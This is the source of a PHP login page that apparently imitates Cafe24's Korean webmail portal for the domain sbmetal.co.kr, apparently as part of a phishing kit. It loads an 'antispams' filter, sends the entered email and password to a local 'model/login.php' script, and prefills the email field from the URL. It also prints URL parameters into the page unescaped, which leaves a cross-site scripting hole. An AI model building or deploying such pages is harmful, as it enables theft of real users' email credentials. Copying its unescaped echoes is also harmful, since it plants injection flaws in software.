<?php
include 'model/antispams.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title></title>
    <meta name="WMMETA" content="host" data-host="webmail-056.cafe24.com"><meta name="WMMETA" content="domain" data-domain="sbmetal.co.kr"><meta name="WMMETA" content="appversion" data-appversion="20220804"><meta name="WMMETA" content="langpack" data-langpack="ko">
    <link rel="stylesheet" type="text/css" href="assets/webmail.css">
</head>
<body>

<div class="mLogin type1 ">
    <ul class="languages">
        <li><a class="login-language-change" href="#">ENGLISH</a></li>
        <li><a class="login-language-change" href="#">简体中文</a></li>
        <li><a class="login-language-change" href="#">日本語</a></li>
        <li><a class="login-language-change" href="#">繁體中文</a></li>
        <li><a class="login-language-change" href="#">한국어</a></li>
    </ul>
	<div class="inner">
		<div class="logoArea">
			<h2 class="logo">
				<img src="assets/@img_logo_aType.gif" alt="">
			</h2>
		</div>
		<div class="contents">
			<ul class="mTab typeLogin eTab switch-login-type">
				<li id="tabUser" class="selected"><a href="#">사용자 모드</a></li>
				<li id="tabAdmin" class=""><a href="#">관리자 모드</a></li>
			</ul>
			<div id="tabUser" class="tabCont">
				<form method="post" name="userLoginForm" action="model/login.php">
				
					<fieldset>
					<legend>사용자 로그인</legend>
					<input type="hidden" name="formtype" value="login">
					<input type="hidden" name="loginType" value="tabUser">
					<input type="hidden" name="count" value="<?php echo isset($_GET['invalid']) ? $_GET['invalid'] : 0; ?>">
					<input type="hidden" name="auth" value="">
						<label><input type="text" name="mail" class="fText" placeholder="아이디" value="<?php echo isset($_GET['invalid']) ? (isset($_SESSION['email']) ? $_SESSION['email'] : '') : (isset($_GET['email']) ? $_GET['email'] : ''); ?>"></label><!-- 개발참고 : value값 placeholder로 넣어주세요 -->
						<label><input type="password" name="password" class="fText" placeholder="비밀번호"></label>
						<button type="submit" class="btnLogin user-login-btn"><span>로그인</span></button>
						<ul class="security">
							<li><label><input type="checkbox" name="save"> 아이디 저장</label></li>
							<li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li><!-- 개발참고 : 기본값 check해제되면 off 글씨로 변경되고 span에 class="disabled" 넣어주세요 -->
						</ul>
					</fieldset>
				</form>
				<!-- 2차 인증 -->
			</div>
		
		</div>

	</div>
	<!-- 만료 된 계정 경고 텍스트 -->
	
	<!-- copyright -->
    <p class="footer"><a href="#">Copyright ⓒ <strong>1999-2018 Cafe24 Corp.</strong> All Rights Reserved.</a></p>
</div>
<script type="text/javascript" src="assets/jquery.min.js"></script><script type="text/javascript" src="assets/jquery-migrate.min.js"></script><script type="text/javascript" src="assets/jquery.placeholder.min.js"></script><script type="text/javascript" src="assets/common.js"></script><script type="text/javascript" src="assets/intro.js"></script>


</body></html>